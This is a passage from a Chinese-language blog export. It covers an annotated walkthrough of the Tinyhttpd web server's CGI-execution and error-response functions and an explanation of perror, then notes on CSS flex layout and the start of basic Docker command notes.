class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2-7-execute-cgi函数⭐⭐"><a href="#2-7-execute-cgi函数⭐⭐" class="headerlink" title="2.7 execute_cgi函数⭐⭐"></a>2.7 execute_cgi函数⭐⭐</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* Execute a CGI script.  Will need to set environment variables as</span></span><br><span class="line"><span class="comment"> * appropriate.</span></span><br><span class="line"><span class="comment"> * Parameters: client socket descriptor</span></span><br><span class="line"><span class="comment"> *             path to the CGI script */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">//执行cgi动态解析</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_cgi</span><span class="params">(<span class="type">int</span> client, <span class="type">const</span> <span class="type">char</span> *path,</span></span><br><span class="line"><span class="params">                 <span class="type">const</span> <span class="type">char</span> *method, <span class="type">const</span> <span class="type">char</span> *query_string)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">1024</span>]; </span><br><span class="line"> <span class="comment">//两根管道</span></span><br><span class="line"> <span class="type">int</span> cgi_output[<span class="number">2</span>];<span class="comment">//声明的读写管道，切莫被名称给忽悠，会给出图进行说明</span></span><br><span class="line"> <span class="type">int</span> cgi_input[<span class="number">2</span>];<span class="comment">//</span></span><br><span class="line"> <span class="comment">//进程pid和状态</span></span><br><span class="line"> <span class="type">pid_t</span> pid;</span><br><span class="line"> <span class="type">int</span> status;</span><br><span class="line">    </span><br><span class="line"> <span class="type">int</span> i;</span><br><span class="line"> <span class="type">char</span> c;</span><br><span class="line">    </span><br><span class="line"> <span class="type">int</span> numchars = <span class="number">1</span>;</span><br><span class="line"> <span class="type">int</span> content_length = <span class="number">-1</span>; <span class="comment">//http报头中的content_length</span></span><br><span class="line"> </span><br><span class="line"> buf[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>; buf[<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">//初始化缓冲区中的第一个元素</span></span><br><span class="line"> <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"> <span class="comment">//如果是GET请求</span></span><br><span class="line"> <span class="comment">//读取并且丢弃头信息</span></span><br><span class="line">  <span class="keyword">while</span> ((numchars &gt; <span class="number">0</span>) &amp;&amp; <span class="built_in">strcmp</span>(<span class="string">&quot;\n&quot;</span>, buf))</span><br><span class="line">   numchars = get_line(client, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"> <span class="keyword">else</span>   </span><br><span class="line"> &#123;</span><br><span class="line">  <span class="comment">//处理的请求为POST</span></span><br><span class="line">  numchars = get_line(client, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">     </span><br><span class="line">  <span class="comment">/* ！通过这个while循环会把请求头都读取完，这样在下边父进程再次recv的时候，就是读取的请求体了 */</span></span><br><span class="line">  <span class="keyword">while</span> ((numchars &gt; <span class="number">0</span>) &amp;&amp; <span class="built_in">strcmp</span>(<span class="string">&quot;\n&quot;</span>, buf))<span class="comment">//循环读取头信息找到Content-Length字段的值</span></span><br><span class="line">  &#123;<span class="comment">//POST请求需要得到Content-Length，&quot;Content-Length&quot;这个字符一共长15位</span></span><br><span class="line">   <span class="comment">//取出一行后，将第16位置&#x27;\0&#x27;，截断前15位字符</span></span><br><span class="line">   buf[<span class="number">15</span>] = <span class="string">&#x27;\0&#x27;</span>;<span class="comment">//目的是为了截取Content-Length:</span></span><br><span class="line">    </span><br><span class="line">   <span class="keyword">if</span> (strcasecmp(buf, <span class="string">&quot;Content-Length:&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    <span class="comment">//buf的第17位就是Content-Length字段的值，</span></span><br><span class="line">    content_length = atoi(&amp;(buf[<span class="number">16</span>]));<span class="comment">//将字符串转换为整数，获取Content-Length的值</span></span><br><span class="line">   numchars = get_line(client, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  &#125;</span><br><span class="line">     </span><br><span class="line">  <span class="keyword">if</span> (content_length == <span class="number">-1</span>) &#123;</span><br><span class="line">  <span class="comment">//如果未获取到，则调用bad_request函数返回错误请求</span></span><br><span class="line">   bad_request(client);</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//返回正确响应码200，这两行应该在下边，emm不知道为什么放这里了</span></span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;HTTP/1.0 200 OK\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//#include&lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">//int pipe(int filedes[2]);</span></span><br><span class="line"><span class="comment">//返回值：成功，返回0，否则返回-1。参数数组包含pipe使用的两个文件的描述符。fd[0]:读管道，fd[1]:写管道。</span></span><br><span class="line"><span class="comment">//必须在fork()中调用pipe()，否则子进程不会继承文件描述符。</span></span><br><span class="line"><span class="comment">//两个进程不共享祖先进程，就不能使用pipe。但是可以使用命名管道。</span></span><br><span class="line"><span class="comment">//pipe(cgi_output)执行成功后，cgi_output[0]:读通道 cgi_output[1]:写通道，这就是为什么说不要被名称所迷惑</span></span><br><span class="line"> <span class="keyword">if</span> (pipe(cgi_output) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">  cannot_execute(client);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (pipe(cgi_input) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">  cannot_execute(client);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> ( (pid = fork()) &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">  cannot_execute(client);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">//fork出一个子进程运行cgi脚本</span></span><br><span class="line"> <span class="keyword">if</span> (pid == <span class="number">0</span>)  <span class="comment">/* 子进程: 运行CGI 脚本 */</span></span><br><span class="line"> &#123;</span><br><span class="line">  <span class="type">char</span> meth_env[<span class="number">255</span>];</span><br><span class="line">  <span class="type">char</span> query_env[<span class="number">255</span>];</span><br><span class="line">  <span class="type">char</span> length_env[<span class="number">255</span>];</span><br><span class="line"> </span><br><span class="line">  dup2(cgi_output[<span class="number">1</span>], <span class="number">1</span>);<span class="comment">//1代表着stdout，0代表着stdin，将系统标准输出重定向为cgi_output[1]</span></span><br><span class="line">  dup2(cgi_input[<span class="number">0</span>], <span class="number">0</span>);<span class="comment">//将系统标准输入重定向为cgi_input[0]，这一点非常关键，</span></span><br><span class="line">                        <span class="comment">//cgi程序中用的是标准输入输出进行交互</span></span><br><span class="line">  close(cgi_output[<span class="number">0</span>]);<span class="comment">//关闭了cgi_output中的读通道</span></span><br><span class="line">  close(cgi_input[<span class="number">1</span>]);<span class="comment">//关闭了cgi_input中的写通道</span></span><br><span class="line">     <span class="comment">/* !!! */</span></span><br><span class="line">  <span class="comment">//CGI标准需要将请求的方法存储环境变量中，然后和cgi脚本进行交互</span></span><br><span class="line">  <span class="comment">//存储REQUEST_METHOD</span></span><br><span class="line">  <span class="built_in">sprintf</span>(meth_env, <span class="string">&quot;REQUEST_METHOD=%s&quot;</span>, method);</span><br><span class="line">  putenv(meth_env);</span><br><span class="line">  <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">//存储QUERY_STRING</span></span><br><span class="line">   <span class="built_in">sprintf</span>(query_env, <span class="string">&quot;QUERY_STRING=%s&quot;</span>, query_string);</span><br><span class="line">   putenv(query_env);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;   <span class="comment">/* POST */</span></span><br><span class="line">    <span class="comment">//存储CONTENT_LENGTH</span></span><br><span class="line">   <span class="built_in">sprintf</span>(length_env, <span class="string">&quot;CONTENT_LENGTH=%d&quot;</span>, content_length);</span><br><span class="line">   putenv(length_env);</span><br><span class="line">  &#125;</span><br><span class="line">     </span><br><span class="line"> <span class="comment">// 表头文件#include&lt;unistd.h&gt;</span></span><br><span class="line"> <span class="comment">// 定义函数</span></span><br><span class="line"> <span class="comment">// int execl(const char * path,const char * arg,....);</span></span><br><span class="line"> <span class="comment">// 函数说明</span></span><br><span class="line"> <span class="comment">// execl()用来执行参数path字符串所代表的文件路径，接下来的参数代表执行该文件时传递过去的argv(0)、argv[1]……，最后一个参数必须用空指针(NULL)作结束。</span></span><br><span class="line"> <span class="comment">// 返回值</span></span><br><span class="line"> <span class="comment">// 如果执行成功则函数不会返回，执行失败则直接返回-1，失败原因存于errno中。</span></span><br><span class="line">  execl(path, path, <span class="literal">NULL</span>);<span class="comment">//执行CGI脚本</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;    <span class="comment">/* 父进程 */</span></span><br><span class="line">  close(cgi_output[<span class="number">1</span>]);<span class="comment">//关闭了cgi_output中的写通道，注意这是父进程中cgi_output变量和子进程要区分开</span></span><br><span class="line">  close(cgi_input[<span class="number">0</span>]);<span class="comment">//关闭了cgi_input中的读通道</span></span><br><span class="line">  <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;POST&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; content_length; i++) &#123;</span><br><span class="line">    <span class="comment">//开始读取POST中的内容</span></span><br><span class="line">    <span class="comment">//因为之前已经把请求头的内容都给读出了，再读就是请求体的内容</span></span><br><span class="line">    recv(client, &amp;c, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//将数据发送给cgi脚本</span></span><br><span class="line">    write(cgi_input[<span class="number">1</span>], &amp;c, <span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//读取cgi脚本返回数据</span></span><br><span class="line">  <span class="keyword">while</span> (read(cgi_output[<span class="number">0</span>], &amp;c, <span class="number">1</span>) &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">//发送给浏览器</span></span><br><span class="line">   send(client, &amp;c, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//运行结束关闭</span></span><br><span class="line">  close(cgi_output[<span class="number">0</span>]);</span><br><span class="line">  close(cgi_input[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//定义函数：pid_t waitpid(pid_t pid, int * status, int options);</span></span><br><span class="line"><span class="comment">//函数说明：waitpid()会暂时停止目前进程的执行, 直到有信号来到或子进程结束.</span></span><br><span class="line"><span class="comment">//如果在调用wait()时子进程已经结束, 则wait()会立即返回子进程结束状态值. 子进程的结束状态值会由参数status 返回,</span></span><br><span class="line"><span class="comment">//而子进程的进程识别码也会一快返回.</span></span><br><span class="line"><span class="comment">//如果不在意结束状态值, 则参数status 可以设成NULL. 参数pid 为欲等待的子进程识别码, 其他数值意义如下：</span></span><br><span class="line"><span class="comment">//1、pid&lt;-1 等待进程组识别码为pid 绝对值的任何子进程.</span></span><br><span class="line"><span class="comment">//2、pid=-1 等待任何子进程, 相当于wait().</span></span><br><span class="line"><span class="comment">//3、pid=0 等待进程组识别码与目前进程相同的任何子进程.</span></span><br><span class="line"><span class="comment">//4、pid&gt;0 等待任何子进程识别码为pid 的子进程.</span></span><br><span class="line">  waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于 execute_cgi 函数中，有关通道的部分，整体流程图中的图解不是特别清晰，推荐看这个：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/%E9%80%9A%E9%81%93%E5%9B%BE%E8%A7%A3.png" alt="通道图解"></p>
<h5 id="bad-request函数"><a href="#bad-request函数" class="headerlink" title="bad_request函数"></a>bad_request函数</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* Inform the client that a request it has made has a problem.</span></span><br><span class="line"><span class="comment"> * Parameters: client socket */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bad_request</span><span class="params">(<span class="type">int</span> client)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"><span class="comment">//发送400</span></span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;HTTP/1.0 400 BAD REQUEST\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;Content-type: text/html\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;&lt;P&gt;Your browser sent a bad request, &quot;</span>);</span><br><span class="line"> send(client, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;such as a POST without a Content-Length.\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="cannot-execute函数"><a href="#cannot-execute函数" class="headerlink" title="cannot_execute函数"></a>cannot_execute函数</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* Inform the client that a CGI script could not be executed.</span></span><br><span class="line"><span class="comment"> * Parameter: the client socket descriptor. */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cannot_execute</span><span class="params">(<span class="type">int</span> client)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"><span class="comment">//发送500</span></span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;HTTP/1.0 500 Internal Server Error\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;Content-type: text/html\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line"> <span class="built_in">sprintf</span>(buf, <span class="string">&quot;&lt;P&gt;Error prohibited CGI execution.\r\n&quot;</span>);</span><br><span class="line"> send(client, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3-其他函数"><a href="#3-其他函数" class="headerlink" title="3. 其他函数"></a>3. 其他函数</h3><h4 id="3-1-perror函数"><a href="#3-1-perror函数" class="headerlink" title="3.1 perror函数"></a>3.1 <a name="perror">perror函数</a></h4><p>在C语言中，<code>perror()</code>是一个用于打印错误信息的函数。它需要一个字符串作为参数，通常是和发生错误相关的系统调用名字。它会将该调用产生的错误信息输出到标准错误(stderr)流中，并在错误消息前面加上该参数字符串。</p>
<p><code>perror()</code>函数位于头文件<code>&lt;stdio.h&gt;</code>中，其定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">perror</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span>;</span><br></pre></td></tr></table></figure>

<p>其中，参数<code>s</code>是一个字符串指针，用于指定与错误消息相关联的文本。如果<code>s</code>指向空字符串或者NULL，则只输出错误消息。</p>
<p>下面是一个简单的示例代码，展示了如何使用<code>perror()</code>来打印从函数<code>open()</code>返回的错误信息：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;non_existent_file&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上述代码中，我们首先尝试打开一个不存在的文件，并将返回值保存在变量<code>fd</code>中。由于文件不存在，<code>open()</code>函数将会返回-1，表示打开文件失败。接着，我们通过<code>perror(&quot;open failed&quot;)</code>来打印错误信息，并退出程序以指示错误。</p>
<p>当运行上述代码时，将会得到如下输出：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">open failed: No such file or directory</span><br></pre></td></tr></table></figure>

<p>可见，<code>perror()</code>函数打印出了一个带有错误消息的字符串，并在其前面加上了传递给它的参数字符串。通过这种方式，我们可以快速定位出错的代码行及其错误原因。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a href="https://www.cnblogs.com/qiyeboy/p/6296387.html">https://www.cnblogs.com/qiyeboy/p/6296387.html</a></p>
<p><a href="https://www.cnblogs.com/tanxing/p/6791812.html">https://www.cnblogs.com/tanxing/p/6791812.html</a></p>
<p><a href="https://www.cnblogs.com/nengm1988/p/7816618.html">https://www.cnblogs.com/nengm1988/p/7816618.html</a></p>
<p><a href="https://blog.csdn.net/u014694510/article/details/86550044">https://blog.csdn.net/u014694510/article/details/86550044</a></p>
<p>预处理问题：<a href="https://qa.1r1g.com/sf/ask/2417769511/">https://qa.1r1g.com/sf/ask/2417769511/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>WEB</category>
        <category>源码分析</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>flex布局</title>
    <url>/2023/03/16/Web/flex%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<h1 id="flex布局"><a href="#flex布局" class="headerlink" title="flex布局"></a>flex布局</h1><h2 id="1-flex布局原理"><a href="#1-flex布局原理" class="headerlink" title="1.flex布局原理"></a>1.flex布局原理</h2><p>flex是flexible Box的缩写，意为“弹性布局”，用来为盒状模型提供最大的灵活性，任何一个容器都可以指定为flex布局。</p>
<ul>
<li>当为父盒子设置为flex布局后，子元素的float、clear和vertical-align属性都会失效。</li>
<li>伸缩（盒）布局&#x3D;弹性（盒）布局&#x3D;flex布局</li>
</ul>
<p>采用Flex布局的元素，称为Flex容器（flex container），简称“容器”。它所有的子元素自动成为容器成员，称为Flex项目（flex item），简称“项目”。</p>
<p><strong>总结：</strong>flex布局原理就是通过给父盒子添加flex属性，来控制子盒子的位置和排列方式。</p>
<h2 id="2-常见父项属性"><a href="#2-常见父项属性" class="headerlink" title="2.常见父项属性"></a>2.常见父项属性</h2><p>以下6个属性是对父元素设置的</p>
<ul>
<li>flex-direction：设置主轴的方向</li>
<li>justify-content：设置主轴上的子元素排列方式</li>
<li>flex-wrap：设置子元素是否换行</li>
<li>align-content：设置侧轴上的子元素的排列方式（多行）</li>
<li>align-items：设置侧轴上的子元素的排列方式（单行）</li>
<li>flex-flow：符合属性，相当于同时设置了flex-direction和flex-wrap</li>
</ul>
<h3 id="2-1-flex-direction"><a href="#2-1-flex-direction" class="headerlink" title="2.1 flex-direction"></a>2.1 flex-direction</h3><h4 id="1-主轴和侧轴"><a href="#1-主轴和侧轴" class="headerlink" title="1.主轴和侧轴"></a>1.主轴和侧轴</h4><p>在flex布局中，是分为主轴和侧轴两个方向的，同样的叫法有：行和列、x轴和y轴</p>
<ul>
<li>默认主轴方向就是x轴方向，水平向右</li>
<li>默认侧轴方向就是y轴方向，水平向下</li>
</ul>
<h4 id="2-属性值"><a href="#2-属性值" class="headerlink" title="2.属性值"></a>2.属性值</h4><p>flex-direction属性决定主轴的方向（即项目的排列方向）</p>
<p>注意：主轴和侧轴是会变化的，就看flex-direction设置谁为主轴，剩下的就是侧轴，而我们的子元素是跟着主轴来排序的。</p>
<table>
<thead>
<tr>
<th>属性值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>row</td>
<td>默认从左到右</td>
</tr>
<tr>
<td>row-reverse</td>
<td>从右到左</td>
</tr>
<tr>
<td>column</td>
<td>从上到下</td>
</tr>
<tr>
<td>column-reverse</td>
<td>从下到上</td>
</tr>
</tbody></table>
<h3 id="2-2-justify-content"><a href="#2-2-justify-content" class="headerlink" title="2.2 justify-content"></a>2.2 justify-content</h3><p>justify-content属性定义了项目在主轴上的对齐方式</p>
<p>注意：使用这个属性之前一定要确定好主轴是哪个？</p>
<table>
<thead>
<tr>
<th>属性值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>flex-start</td>
<td>默认从头开始，如果主轴是x轴，则从左到右</td>
</tr>
<tr>
<td>flex-end</td>
<td>从尾部开始排列</td>
</tr>
<tr>
<td>center</td>
<td>在主轴居中对齐（x轴：水平居中）</td>
</tr>
<tr>
<td>space-around</td>
<td>平分剩余空间</td>
</tr>
<tr>
<td>space-between</td>
<td>先两边贴边再平分剩余空间（重要）</td>
</tr>
</tbody></table>
<h3 id="2-3-flex-wrap"><a href="#2-3-flex-wrap" class="headerlink" title="2.3 flex-wrap"></a>2.3 flex-wrap</h3><p>默认情况下，项目都排在一条线上（又称为：轴线）。flex-wrap属性定义，flex布局中默认是不换行的。</p>
<table>
<thead>
<tr>
<th>属性值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>nowrap</td>
<td>默认值；不换行</td>
</tr>
<tr>
<td>wrap</td>
<td>换行</td>
</tr>
</tbody></table>
<h3 id="2-4-align-items"><a href="#2-4-align-items" class="headerlink" title="2.4 align-items"></a>2.4 align-items</h3><p>该属性是控制子项在侧轴（默认是y轴）上的排列方式，在子项为单行的时候使用</p>
<table>
<thead>
<tr>
<th>属性值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>flex-start</td>
<td>默认值，从上到下</td>
</tr>
<tr>
<td>flex-end</td>
<td>从上到下</td>
</tr>
<tr>
<td>center</td>
<td>挤在一起居中（垂直居中）</td>
</tr>
<tr>
<td>stretch</td>
<td>拉伸（不要给子盒子高度）</td>
</tr>
</tbody></table>
<h3 id="2-5-align-content"><a href="#2-5-align-content" class="headerlink" title="2.5 align-content"></a>2.5 align-content</h3><p>设置子项在侧轴上的排列方式，并且只能用于子项出现换行的情况（多行），在单行下是没有效果的。</p>
<table>
<thead>
<tr>
<th>属性值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>flex-start</td>
<td>默认值在侧轴的头部开始排列</td>
</tr>
<tr>
<td>flex-end</td>
<td>在侧轴的尾部开始排列</td>
</tr>
<tr>
<td>center</td>
<td>在侧轴中间显示</td>
</tr>
<tr>
<td>space-around</td>
<td>子项在侧轴平分剩余空间</td>
</tr>
<tr>
<td>space-between</td>
<td>子项在侧轴先平分在两头，再平分剩余空间</td>
</tr>
<tr>
<td>stretch</td>
<td>设置子项元素高度平分父元素高度</td>
</tr>
</tbody></table>
<p><strong>align-content和align-items区别</strong></p>
<ul>
<li>align-items适用于单行情况，只有上对齐，下对齐，居中和拉伸</li>
<li>align-content适用于换行（多行）的情况下（单行情况无效），可以设置上对齐、下对齐、居中、拉伸以及平分剩余空间等属性值。</li>
<li>总结就是单行找align-items，多行找align-content</li>
</ul>
<h3 id="2-6-flex-flow"><a href="#2-6-flex-flow" class="headerlink" title="2.6 flex-flow"></a>2.6 flex-flow</h3><p>flex-flow属性是flex-direction和flex-wrap的复合属性。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">flex-flow</span>: row wrap;</span><br></pre></td></tr></table></figure>

<h2 id="3-常见子项属性"><a href="#3-常见子项属性" class="headerlink" title="3. 常见子项属性"></a>3. 常见子项属性</h2><ul>
<li>flex子项目占的份数</li>
<li>align-self控制子项目自己在侧轴的排列方式</li>
<li>order属性定义子项的排序顺序（前后顺序）</li>
</ul>
<h3 id="3-1-flex属性"><a href="#3-1-flex属性" class="headerlink" title="3.1 flex属性"></a>3.1 flex属性</h3><p>flex属性定义子项目分配剩余空间，用flex来表示占多少份数</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">	<span class="attribute">flex</span>: &lt;number&gt;; <span class="comment">/* default 0*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-align-self"><a href="#3-2-align-self" class="headerlink" title="3.2 align-self"></a>3.2 align-self</h3><p>align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。</p>
<p>默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。</p>
<h3 id="3-3-order"><a href="#3-3-order" class="headerlink" title="3.3 order"></a>3.3 order</h3><p>order属性定义项目的排列顺序</p>
<p>数值越小，排列越靠前，默认为0</p>
<p>注意：与z-index不一样</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>docker学习</title>
    <url>/2022/03/17/docker/docker%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h1><h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker version	#版本信息</span><br><span class="line">docker info 	#系统信息</span><br><span class="line"></span><br><span class="line">docker 命令 --help</span><br></pre></td></tr></table></figure>

<h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><p><strong>docker images</strong> 查看所有本地的主机上的镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/guoxb/Desktop# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID   CREATED   SIZE</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解释</span></span><br><span class="line">repository	镜像的仓库源</span><br><span class="line">TAG			镜像的标签</span><br><span class="line">IMAGE ID	镜像的id</span><br><span class="line">CREATED		镜像的创建时间</span><br><span class="line">SIZE		镜像的大小</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">可选项</span></span><br><span class="line"> -a，--all	列出所有的镜像</span><br><span class="line"> -q，--quiet	只显示镜像的id</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>docker search</strong> 搜索命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/guoxb/Desktop# docker search mysql</span><br><span class="line">NAME                             DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                            MySQL is a widely used, open-source relation…   12226     [OK]       </span><br><span class="line">mariadb                          MariaDB Server is a high performing open sou…   4693      [OK]       </span><br><span class="line">mysql/mysql-server               Optimized MySQL Server Docker images. Create…   907                  [OK]</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">可选项</span></span><br><span class="line">--filter 过滤</span><br><span class="line">eg：</span><br><span class="line">	-f=starts=3000 搜索收藏大于3000的镜像</span><br><span class="line">root@ubuntu:/home/guoxb/Desktop# docker search mysql -f=stars=3000</span><br><span class="line">NAME      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql     MySQL is a widely used, open-source relation…   12226     [OK]       </span><br><span class="line">mariadb   MariaDB Server is a high performing open sou…   4693      [OK] </span><br></pre></td></tr></table></figure>

<p><strong>docker pull</strong> 下载镜像</p>
